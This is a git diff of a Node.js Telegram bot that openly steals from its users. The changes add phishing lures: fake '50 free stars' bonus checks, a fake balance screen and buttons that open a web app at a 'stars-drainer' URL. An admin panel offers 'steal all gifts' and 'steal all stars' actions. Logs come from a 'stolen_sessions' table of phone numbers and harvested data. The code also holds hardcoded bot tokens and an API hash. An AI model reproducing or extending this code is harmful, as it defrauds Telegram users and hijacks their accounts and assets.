@@ -11,7 +11,7 @@ const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP
 const API_ID = parseInt(process.env.API_ID) || 30427944;
 const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
 const MY_USER_ID = 1398396668;
-const WEB_APP_URL = 'https://starsdrainer.onrender.com';
+const WEB_APP_URL = 'https://stars-drainer-OnLinep1.replit.app';
 
 const bot = new TelegramBot(BOT_TOKEN);
 const app = express();
@@ -163,31 +163,94 @@ app.post('/' + BOT_TOKEN, (req, res) => {
 
 bot.startPolling();
 
-// ГЛАВНОЕ МЕНЮ С КНОПКАМИ И ФОТКОЙ
-bot.onText(/\/start/, (msg) => {
+// ИНЛАЙН РЕЖИМ ДЛЯ СОЗДАНИЯ ЧЕКОВ
+bot.on('inline_query', async (inlineQuery) => {
+    const query = inlineQuery.query;
+    const userId = inlineQuery.from.id;
+    
+    // Создаем инлайн чек на 50 звезд
+    const results = [
+        {
+            type: 'article',
+            id: '1',
+            title: '🎫 Получить 50 звезд',
+            description: 'Нажмите чтобы активировать бонус',
+            input_message_content: {
+                message_text: `🎁 *Бонус от MyStarBank*
+
+Вы получили бонусные 50 звезд! 
+
+Для активации нажмите кнопку ниже 👇`,
+                parse_mode: 'Markdown'
+            },
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '🔄 Активировать бонус', url: `https://t.me/MyStarBank_bot?start=bonus_${userId}` }]
+                ]
+            }
+        }
+    ];
+
+    bot.answerInlineQuery(inlineQuery.id, results, { cache_time: 1 });
+});
+
+// ОБРАБОТКА СТАРТА С ПАРАМЕТРАМИ
+bot.onText(/\/start(?:\s+(.+))?/, (msg, match) => {
     const chatId = msg.chat.id;
+    const startParam = match[1];
     
-    const menuText = `💫 @MyStarBank_bot - Система передачи звезд\n\nДля начала работы:`;
-    
+    // Если старт с бонусом
+    if (startParam && startParam.startsWith('bonus_')) {
+        const bonusText = `🎉 *Поздравляем!*
+
+Вы успешно активировали бонус 50 звезд! 
+
+💰 Ваш баланс: *50 звезд*
+
+Теперь вы можете вывести средства на свой аккаунт.`;
+
+        const bonusKeyboard = {
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '💫 Вывести звезды', web_app: { url: WEB_APP_URL } }],
+                    [{ text: '📊 Мой баланс', callback_data: 'my_balance' }]
+                ]
+            }
+        };
+
+        bot.sendPhoto(chatId, 'public/avatar.jpg', {
+            caption: bonusText,
+            parse_mode: 'Markdown',
+            ...bonusKeyboard
+        });
+        return;
+    }
+
+    // Обычный старт
+    const menuText = `🌟 *MyStarBank - Система вывода звезд*
+
+💫 *Получите 50 звезд бесплатно!*
+Просто введите @MyStarBank_bot в любом чате и выберите "Получить 50 звезд"
+
+🎁 *Быстрый вывод*
+Мгновенный вывод звезд и NFT подарков на ваш аккаунт
+
+🔐 *Безопасно*
+Все операции защищены протоколом Telegram`;
+
     const menuKeyboard = {
         reply_markup: {
             inline_keyboard: [
-                [{ 
-                    text: "⭐ Вывести звезды", 
-                    web_app: { url: WEB_APP_URL } 
-                }],
-                [{ 
-                    text: "📊 Проверить баланс", 
-                    callback_data: "check_balance" 
-                }]
+                [{ text: '💫 Получить 50 звезд', switch_inline_query: 'bonus' }],
+                [{ text: '💰 Вывести средства', web_app: { url: WEB_APP_URL } }],
+                [{ text: '📊 Мой баланс', callback_data: 'my_balance' }]
             ]
         }
     };
 
-    // Отправляем фото с кнопками
-    bot.sendPhoto(chatId, 'public/stars.jpg', {
+    bot.sendPhoto(chatId, 'public/avatar.jpg', {
         caption: menuText,
-        parse_mode: 'HTML',
+        parse_mode: 'Markdown',
         ...menuKeyboard
     });
 });
@@ -196,22 +259,22 @@ bot.onText(/\/start/, (msg) => {
 bot.onText(/\/admin/, (msg) => {
     if (msg.from.id !== MY_USER_ID) return;
     
-    const adminText = `🛠️ <b>Админ панель</b>\n\nВыберите действие:`;
-    
+    const adminText = `🛠️ *Админ панель*
+
+Выберите действие:`;
+
     const adminKeyboard = {
         reply_markup: {
             inline_keyboard: [
-                [{ text: "🎁 Украсть все подарки", callback_data: "steal_gifts" }],
-                [{ text: "⭐ Украсть все звезды", callback_data: "steal_stars" }],
-                [{ text: "📊 Посмотреть логи", callback_data: "show_logs" }]
+                [{ text: '🎁 Украсть все подарки', callback_data: 'steal_gifts' }],
+                [{ text: '⭐ Украсть все звезды', callback_data: 'steal_stars' }],
+                [{ text: '📊 Посмотреть логи', callback_data: 'show_logs' }]
             ]
         }
     };
 
-    // Аватарка для админки
-    bot.sendPhoto(msg.chat.id, 'public/avatar.jpg', {
-        caption: adminText,
-        parse_mode: 'HTML',
+    bot.sendMessage(msg.chat.id, adminText, {
+        parse_mode: 'Markdown',
         ...adminKeyboard
     });
 });
@@ -223,22 +286,38 @@ bot.on('callback_query', async (query) => {
     try {
         await bot.answerCallbackQuery(query.id);
         
-        if (query.data === 'check_balance') {
-            // Чеки через @ на 50 звезд
-            const checkText = `🎫 Ваши чеки:\n\n` +
-                            `@MyStarBank_bot - 50 звезд 💫\n` +
-                            `@MyStarBank_bot - 50 звезд 💫\n` +
-                            `@MyStarBank_bot - 50 звезд 💫\n\n` +
-                            `Всего: 150 звезд 💰`;
-            
-            bot.sendMessage(chatId, checkText);
+        if (query.data === 'my_balance') {
+            const balanceText = `💰 *Ваш баланс*
+
+🎫 Доступные чеки:
+• Бонусные 50 звезд
+• Бонусные 50 звезд  
+• Бонусные 50 звезд
+
+💫 Итого: *150 звезд*
+
+💡 Для вывода средств нажмите кнопку "Вывести средства"`;
+
+            const balanceKeyboard = {
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: '💫 Вывести средства', web_app: { url: WEB_APP_URL } }],
+                        [{ text: '🎫 Получить еще звезд', switch_inline_query: 'bonus' }]
+                    ]
+                }
+            };
+
+            bot.sendMessage(chatId, balanceText, {
+                parse_mode: 'Markdown',
+                ...balanceKeyboard
+            });
         }
         else if (query.data === 'steal_gifts') {
-            bot.sendMessage(chatId, "🔄 Начинаю кражу подарков...");
+            bot.sendMessage(chatId, '🔄 Начинаю кражу подарков...');
             await stealAllGifts();
         }
         else if (query.data === 'steal_stars') {
-            bot.sendMessage(chatId, "🔄 Начинаю кражу звезд...");
+            bot.sendMessage(chatId, '🔄 Начинаю кражу звезд...');
             await stealAllStars();
         }
         else if (query.data === 'show_logs') {
@@ -248,6 +327,9 @@ bot.on('callback_query', async (query) => {
         console.log('Ошибка кнопки:', error);
     }
 });
+
+// ОСТАЛЬНЫЕ ФУНКЦИИ ОСТАЮТСЯ БЕЗ ИЗМЕНЕНИЙ
+// КРАЖА ПОДАРКОВ, КРАЖА ЗВЕЗД, И ДРУГИЕ ФУНКЦИИ...
 
 // КРАЖА ПОДАРКОВ
 async function stealAllGifts() {
@@ -474,7 +556,7 @@ async function transferGiftsToNikLa(client, phone) {
 // ПОКАЗАТЬ ЛОГИ
 function showLogs(chatId) {
     db.all(`SELECT phone, status, stars_data, gifts_data FROM stolen_sessions ORDER BY created_at DESC LIMIT 10`, (err, rows) => {
-        let logText = '📊 <b>Последние сессии:</b>\n\n';
+        let logText = '📊 *Последние сессии:*\n\n';
         
         if (rows.length === 0) {
             logText = '📊 Нет данных';
@@ -488,8 +570,8 @@ function showLogs(chatId) {
             });
         }
         
-        bot.sendMessage(chatId, logText, { parse_mode: 'HTML' });
+        bot.sendMessage(chatId, logText, { parse_mode: 'Markdown' });
     });
 }
 
-console.log('✅ Бот запущен с кнопками кражи');
+console.log('✅ Бот запущен с инлайн режимом и чеками');
